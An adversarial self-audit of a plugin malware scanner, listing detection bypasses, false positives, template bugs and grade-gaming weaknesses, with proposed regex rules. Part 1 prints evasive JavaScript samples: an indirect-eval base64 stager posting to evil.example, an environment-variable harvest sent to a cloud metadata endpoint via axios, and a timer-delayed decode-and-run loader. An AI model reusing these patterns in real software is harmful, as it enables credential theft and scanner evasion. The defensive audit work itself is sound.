# Scanner Self-Audit: tools/scan and templates/plugin-starter

Status: adversarial self-audit (review only, no code changed). Date: 2026-08-25.
Scope: `tools/scan/src/**` at corpus version 2026.08.1, scanner version 0.1.0, and
`templates/plugin-starter/**`. Method: source read plus empirical probes executed against
the built `dist/` bundle; every claim below was reproduced by running the scanner on the
cited snippet. The built-in self-test suite passes (43/43) on the same build.

Severity scale used here reflects impact on the trust layer's core promise: an undetected
malicious pattern is critical, a wrong grade is high, noise that erodes card credibility is
medium. The pipeline's own framing applies: this is stage S3; S4/S5 remain the backstop.
But the charter's bar is "plugins you can prove are harmless", so static blind spots are
reported against that bar, not against a best-effort baseline.

---

## Part 1: Scanner bypasses

Three end-to-end malicious snippets that the current rule set under-detects or does not
detect at all. Each was run through `scanContent` on the built dist; results shown are
actual scanner output.

### Bypass 1: indirect eval stager with base64 payload — grade A, zero findings

```js
// lib/stager.js
const run = (0, eval);
run(atob("ZmV0Y2goImh0dHBzOi8vY29sbGVjdC5ldmlsLmV4YW1wbGUveCIsIHttZXRob2Q6IlBPVNQifSk7"));
// decoded payload: fetch("https://collect.evil.example/x",{method:"POST"});
```

Measured result: **no findings, score 100, grade A**.

Why it evades:

- EXEC-001 (`(?<![.\w$])eval\s*\(`) requires the callee token `eval(`. The indirect idiom
  `(0, eval)` binds eval to a variable first; the later call site is `run(`. The corpus
  (`docs/trust/heuristics-corpus.md` H-EVAL-01) explicitly requires detecting `(0, eval)`,
  `globalThis.eval`, and aliasing (`const e = eval; e(src)`), so this is an implementation
  gap against the normative spec, not a spec limitation.
- OBFU-002 only fires when `atob(` is *lexically adjacent* to `eval(`/`Function(`. Here the
  decode result flows through a variable, so both halves of the chain are invisible.
- Probes confirmed each variant independently silent: `(0, eval)`, `globalThis.eval(...)`,
  bare `Function("...")` without `new`, and `const e = eval; e(x)` all produce zero findings.

Fix (proposed rules):

- New EXEC-010 (high, escalate to critical in shipped artifacts):
  `\(\s*0\s*,\s*eval\s*\)|(?:globalThis|window|global|self)\s*\.\s*eval\b`
- New EXEC-011 (high): eval-as-value aliasing:
  `\b(?:const|let|var)\s+\w+\s*=\s*(?:(?:globalThis|window|self)\s*\.\s*)?eval\b` and
  `(?<![.\w$])Function\s*\(\s*[^\s)]` for the call-as-function form (H-EVAL-02 already
  specifies this sketch).
- Extend OBFU-002 to two-step flows: flag any file where a decode call
  (`atob|unescape|decodeURIComponent|Buffer.from(...,"base64")`) appears within N lines of,
  or in the same function body as, any EXEC-family hit, even via intermediates. Regex-only
  approximation: `(?:eval|Function)\s*\(\s*\w+\s*\)` combined with a decode-call co-presence
  check per file. Longer term this needs the AST pass the corpus mandates (§0: "regex must
  never be the sole basis for a critical finding").

### Bypass 2: computed-property env harvest exfiltrated through a third-party HTTP client — one unrelated finding, grade C

```js
// lib/telemetry.js
import axios from "axios";
export async function ping(url) {
  await axios.post(url ?? "http://169.254.169.254/latest/meta-data/", { ...process["env"] });
}
```

Measured result: exactly one finding (NET-007, the literal URL), no CRED finding, so the
CRED+NET hard gate does not fire; grade C instead of F. Note the URL here points at a cloud
metadata endpoint, which is the canonical SSRF/credential-stealing target, and the actual
secret harvest (`{ ...process["env"] }`) is invisible.

Why it evades:

- CRED-006 matches only `...process.env`, `Object.keys(process.env)` and variants with
  literal-dot member access. Computed access `process["env"]` bypasses it. The same gap
  defeats CRED-007 (`process.env.TOKEN`): `process["env"]["GH_TOKEN"]` is invisible.
- NET has no detector for third-party HTTP client libraries. `axios.post`,
  `got(...)`, `node-fetch`, `undici.request`, `ky` all perform egress while matching none of
  NET-001..006. Probe: `axios.post(process.env.EXFIL_URL, data)` yields zero findings.
- NET-009's decode-adjacency requirement means staged exfil also passes: decode to a
  variable then `fetch(var, {method:"POST"})` produces only NET-001 (probe-verified).

Fix (proposed rules):

- Harden CRED-006/CRED-007 to accept computed member access:
  `process\s*(?:\.\s*env\s*|\[\s*['"]env['"]\s*\])`, and add spread/enumeration over either
  form. Severity unchanged (critical for enumeration).
- New CRED-011 (medium): any string-keyed access on `process` other than the documented
  members (`env`, `argv`, `platform`, ...): flags `process["binding"]` style escapes too.
- New NET-011 (medium, "imports a known HTTP client library"): patterns for
  `require|from ['"](axios|got|node-fetch|undici|ky|superagent|request)['"]`. Medium is the
  right default because bundling such a client is common and legitimate; the point is that
  the card must list the egress capability. Pair with the AST pass later to resolve the
  called method.
- Add `169.254.169.254` and RFC 1918 link-local targets to a NET detector (high): URLs to
  metadata endpoints have essentially no benign plugin use. Also add them as NON_EGRESS_HOST
  exceptions *removed* — currently they are treated as ordinary unknown hosts, which is fine
  only because NET-007 fires; making them explicit raises clarity and survives future
  allowlist changes.

### Bypass 3: delayed staged loader via setTimeout(string) built from Buffer.decode — grade A

```js
// lib/scheduler.js
const stage1 = "Y29uc29sZS5ldmFsKCdBd2FpdCBmZXRjaCgiaHR0cHM6Ly9leGFtcGxlLmNvbS9wIiknKQ==";
setTimeout(Buffer.from(stage1, "base64").toString("utf8"), 60000);
```

Measured result: single HOOK-006 (top-level timer, medium), score 96, **grade A**. The
decoded payload here contains `eval('Await fetch(...)')`: a real staged loader would fetch
stage 2 and run it.

Why it evades:

- EXEC-009 catches `setTimeout("` with a *literal quote*, not `setTimeout(<expr>)` where the
  expression evaluates to a string. Node evaluates a string first argument as code, so this
  is dynamic execution delivered on a timer, i.e. the delayed-beacon shape the pipeline doc
  says the probe exists to catch.
- The decode (`Buffer.from(..., "base64")`) is not lexically adjacent to eval/Function, so
  OBFU-002 misses it; the blob itself (52 chars) is far below OBFU-001's 120-char entropy
  gate, deliberately split to stay under it.

Fix (proposed rules):

- Widen EXEC-009 to flag any non-function first argument shape:
  `set(?:Timeout|Interval)\s*\(\s*(?!function\b|\(|async\b)[^,)]+[,)]` at medium, keeping
  high/critical when the argument visibly involves decode calls
  (`Buffer\.from|atob|fromCharCode` appearing in the argument expression). Known FP to
  encode in refine: passing an identifier holding a function reference cannot be resolved by
  regex; emit at medium confidence with a note (mirrors H-EVAL-03's "require positive string
  evidence" caveat).
- New OBFU-010 (medium): `Buffer\s*\.\s*from\s*\([^)]{0,80},\s*['"]base64['"]\s*\)` anywhere
  in a file that also matches any EXEC or NET detector, regardless of adjacency. Base64
  decode inside a network/exec-capable module is the compounding signal the OBFU family
  exists to surface.
- Lower MIN_BLOB_LENGTH or add a second tier (~48 chars, low severity) so split blobs still
  leave evidence without re-introducing the SVG false-positive problem.

Related evasion, related fix (finding 4): the scanner skips files larger than 32 MiB
silently (`index.ts` MAX_FILE_BYTES check increments `filesSkipped` with no finding). A 33 MiB
padding blob around a small payload module was measured skipped while its tiny sibling
carried all findings; a payload hidden in the oversized file itself would vanish from the
report entirely, and the JSON records only a count. Pipeline §S1 treats E-SIZE as abort-plus-
finding. Fix: emit SUPPLY-001 (high, "file exceeds scan limit; content unanalyzed") per
skipped-oversize file and cap the grade at C, mirroring the crash-path SUPPLY-000 handling
that already exists for rule failures.

---

## Part 2: False-positive analysis

Rules most likely to flag benign plugins, with measured examples. Every FP below was
confirmed against the built dist.

1. **EXEC-005 fires on `RegExp.prototype.exec`** (high, confidence 0.55). Measured:
   `/^v(\d+)/.exec(version)` produces EXEC-005. `.exec()` on a regex is idiomatic JS;
   the rule text acknowledges the risk ("an unrelated local helper") but ships anyway.
   Fix: negative lookbehind for `\)\s*` and `\w\s*=` is not enough; require the call target
   to not be preceded by `.` *or* `/` (regex literal) — practical regex fix:
   `(?<![\w.$/)])\bexec\s*\(` plus refine rejecting matches whose preceding 2 chars are
   `)/`. Better: drop `.exec(` from the alternation and rely on EXEC-004 (child_process
   import) for correlation, since a spawn import already fires independently.
2. **NET-010 fires on any `"https://" + host` construction**, including config-driven base
   URLs (`const base = "https://" + host + "/api"`), which is how well-behaved API plugins
   build endpoints. Measured. This is intended detection, but its current message ("defeats
   literal-URL scanning") plus high severity will mislabel every configurable-base-URL
   plugin. Fix: keep detection, lower to medium when the concatenation operands are plain
   identifiers (config-shaped), and reserve high for operand sets containing decode calls.
3. **CRED-007 fires on reading one named, user-owned secret var** (`GITHUB_TOKEN`),
   severity medium. This is normal for any plugin that talks to an API on the user's behalf;
   the note admits it. Combined with NET-008 (any api.github.com URL, low), a textbook
   benign GitHub plugin accumulates mediums that cap it at B via score alone. Fix options:
   downgrade single named-var reads to info/low with documentation-required wording, or make
   the B band tolerate documented CRED-007 hits explicitly (spec change in scoring, out of
   code scope here).
4. **OBFU-006 fires on UTF-8 BOM and U+2028/U+2029 inside string literals.** Measured: a
   BOM-prefixed clean file yields OBFU-006 high. BOMs are produced routinely by Windows
   editors; U+2028 appears legitimately in generated multiline strings. Both are Trojan-
   Source-relevant *in identifiers/operators*, but a BOM at offset 0 is not concealment.
   Fix: exempt a leading BOM (offset 0) and treat U+2028/2029 (line separators, not bidi
   controls) as low; keep high for U+202A-202E bidi overrides and zero-width chars after
   offset 0.
5. **HOOK-005 (top-level IIFE) and HOOK-007 (`npm install|i|exec`, `npx`) fire on CI
   workflows and docs.** Measured: the template's own `.github/workflows/ci.yml` gets three
   HOOK-007 highs and one CRED-009 high (the word `.npmrc` in a comment) and grades the
   completely-clean starter D (51/100); see part 3. CI files are build-time, not runtime;
   `.npmrc` mentions in comments are documentation. Fix: apply HOOK family detectors only to
   package.json scripts and runtime source paths (exclude `.github/**`, `docs/**`), and give
   credential-access a comment-aware path for YAML/markdown-adjacent files (maskComments
   handles `#` comments only if extended per-filetype).
6. **Self-scan paradox (context for triage):** scanning `tools/scan` itself grades F with
   ~130 findings because the rule corpus's own regex literals match their own patterns in
   source and dist. Expected for a rules engine, but it means any repo containing security
   tooling needs suppression affordances. Fix (pipeline-level): support a committed
   suppressions file keyed by excerpt hash, rendered transparently on the card, per the
   corpus's "downgrade with recorded justification" concept.

Non-FP confirmations (checked, currently correct): comments are masked (eval in comment does
not fire); localhost/example.com do not produce NET findings; KNOWN_HOSTS land at low.

---

## Part 3: Template correctness

Verdict: the template matches the documented DSH plugin shape closely and is safe-by-
construction in its runtime code. It fails its own "Grade-A" claim only because the scanner
flags its CI workflow (part 2, item 5). Findings:

1. **Shape vs harness sources (verified against reference checkout):**
   - `apply(ctx, config)`, `name`, `inject` exports: match `docs/user/develop/basic/index.md`
     and shipped plugins (`command-goal` registers via `ctx.commands.register({name:'goal',...})`).
   - CommandDefinition usage verified against
     `reference/deepseek-harness/packages/interaction/commands/src/index.ts:54-71`:
     `{name, description, input?, handler}` with handler returning
     `{kind:'success'|'error'}` — the template's ping command matches exactly.
   - SkillRegistration verified against
     `reference/deepseek-harness/packages/skill/skill/src/index.ts:95-101`:
     `Omit<SkillDefinition,'invocation'|'provider'>` with optional invocation/provider —
     the template's `ctx.skills.register({name, description, source, content})` matches.
     The template's TODO(verify) markers are honest and correctly placed.
2. **Command name grammar mismatch (real bug, will throw at load).** Template uses
   `'starter:ping'`. Upstream grammar is `COMMAND_NAME = /^[a-z][a-z0-9_-]*$/u`
   (commands/src/index.ts:28) and parse-time dispatch uses
   `/^\/([a-z][a-z0-9_-]*)(?=$|[\t\n\r ])/u` (:117). A colon is invalid: registration
   throws `TypeError: command name "starter:ping" must match ...`. No upstream package
   registers a colonated command name. The README's verify step (`type /starter:ping`)
   would fail before any smoke test. Same issue applies to the CHARTER's `/bridge:install`
   naming convention. Fix: rename to `starter-ping` (or `ping` behind the plugin namespace)
   everywhere in template + README, and reconcile the dsh-bridge command-port naming scheme
   with the harness grammar.
3. **Skill name is valid**: `starter-etiquette` matches `SKILL_NAME =
   /^[a-z0-9]+(?:-[a-z0-9]+)*$/` (skill/src/index.ts:20). Good.
4. **Peer-dep version drift (unsafe-ish default).** Template pins
   `@deepseek-ai/schemastery ^4.0.0`; the harness vendors schemastery 3.18.1
   (`vendor/schemastery/package.json`). A plugin installing against ^4 may resolve a major
   the harness never tested. Cordis `^4.0.1` matches the pipeline doc's stated peer (4.0.1).
   Fix: align schemastery to the vendored line (e.g. `^3.18.1`) or document why ^4 is
   expected to be compatible; add a CI job asserting peers resolve against the harness
   checkout (the CI TODO(verify) already gestures at this).
5. **Unsafe defaults: none found in runtime code.** src/index.ts performs no I/O, no timers,
   no dynamic execution; SECURITY.md claims match the code (verified by reading both).
   package.json declares no lifecycle scripts; `files` excludes src; CI builds with
   `tsc --noEmit && tsc`.
6. **Template fails its own scanner (cosmetic but reputationally important).** Measured:
   `dsh-scan templates/plugin-starter` => grade D, score 51, four highs: CRED-009 + 3x
   HOOK-007, all in `.github/workflows/ci.yml` (comment mentioning `.npmrc`; `npm install`;
   `npx tsc` x2). A "Grade-A starter" graded D by the project's own trust tool undermines
   the card story on the repo's front page. Fix follows part 2 item 5 (scope HOOK/CRED file
   filters), after which the template scans clean.

---

## Part 4: Grade heuristic sanity (gaming analysis)

The grading function (`report.ts`) is monotone and deterministic; caps only lower. But the
score model can be gamed, and one hard gate is gameable today:

1. **Splitting files defeats the CRED+NET auto-F.** The gate keys on family co-occurrence
   *per file*. Measured: CRED-003 in `lib/a.js` + NET-001 in `lib/b.js` => gates empty,
   grade D. The same two lines in one file => F. Any author (or obfuscator layout) naturally
   splits reads from sends across modules. Pipeline §S3 says reachability-unknown must be
   treated as reachable; the implementation narrowed "same control-flow region" to "same
   file", which flips fail-closed into fail-open across module boundaries. Fix (staged):
   (a) short term, widen the gate to same-directory or whole-package when both families
   present with any OBFU signal; (b) implement intra-package import-graph reachability as
   the corpus intends (follow only intra-package imports, per §0.2.3) so cred->send flows
   through `import` statements are caught; (c) document remaining gaps on the card.
2. **Score floor gaming via file splitting.** Deductions are per finding with no
   cross-file aggregation: six unrelated medium findings across six files grade B
   (measured), ten lows grade A (measured), twenty-four lows grade B (measured). An author
   who fragments risky behavior across many small files dilutes the per-severity counts.
   Conversely there is no penalty for *number of files touched*, so volume is free.
   Fix: add a density term (deduction multiplier when >K distinct files carry findings of
   the same family) or a structural cap: any finding in >=3 distinct files of the same
   family caps at C pending review. Keep it simple: ponytail says pick one; the density
   multiplier is the smallest change that removes the incentive.
3. **Threshold cliffs invite threshold shaving.** Bands are A>=90, B>=75, C>=55, D>=35 with
   weights low=1, medium=4, high=12, critical=34. Nine lows stay A; one more low drops to B.
   Authors can tune payloads to sit just above thresholds (e.g. ensure exactly one medium
   total). This is inherent to public thresholds, and publishing them is a feature
   (auditability); mitigation is not secrecy but the S4/S5 stages plus the caps. No change
   proposed beyond noting the cliff behavior in the methodology section.
4. **filesSkipped opacity enables hiding (cross-ref part 1 finding 4).** Skipped files are
   counted, not cited; oversize-skip emits nothing. Gaming shape: pad one module past 32 MiB
   containing the payload. Fix as stated: SUPPLY-001 per oversize file + grade cap.
5. **What holds up:** hard gates (OBFU-002, NET-009, install-hook-shell, EXEC-family cap),
   monotone caps, deterministic output, and the draft-not-verdict labeling all resist the
   obvious games. The self-test asserts several of these properties; extend self-test with
   the bypass snippets from part 1 as negative fixtures once fixes land.

---

## Finding index (severity ordered)

| # | Severity | Area | One-line summary |
|---|---|---|---|
| 1 | Critical | scanner | Indirect eval / Function-as-value / aliased-eval forms produce zero EXEC findings |
| 2 | Critical | scanner | Computed `process["env"]` enumeration invisible to CRED-006/007; breaks the CRED+NET gate |
| 3 | High | scanner | Third-party HTTP clients (axios/got/node-fetch/undici/ky) generate no NET evidence |
| 4 | High | scanner | Oversized (>32 MiB) files skipped silently with no finding and no grade effect |
| 5 | High | scanner | Staged decode-then-execute via variables defeats OBFU-002 adjacency; setTimeout(expr-string) defeats EXEC-009 |
| 6 | High | template | Command name `starter:ping` violates COMMAND_NAME grammar; registration throws at load |
| 7 | High | grading | CRED+NET auto-F gate defeated by splitting reads and sends across files |
| 8 | Medium | scanner | EXEC-005 false-positives on RegExp .exec(); high severity erodes trust |
| 9 | Medium | scanner | OBFU-006 fires on UTF-8 BOM and U+2028 in strings |
| 10 | Medium | scanner | HOOK/CRED rules fire on CI workflows and comments; template grades D on itself |
| 11 | Medium | grading | Per-finding deductions reward fragmenting behavior across many files |
| 12 | Low | scanner | NET-010 high on config-shaped URL concatenation; CRED-007 medium on named secret vars |
| 13 | Low | template | schemastery peer ^4.0.0 vs harness-vendored 3.18.1 |

Proposed new-rule summary (for the corpus update PR): EXEC-010, EXEC-011, CRED-011,
NET-011, OBFU-010, SUPPLY-001; modifications to EXEC-005/009, OBFU-001/002/006, CRED-006/
007, NET-010, and file-type scoping for the HOOK family. Each needs positive/negative
fixtures per the corpus contract before landing.
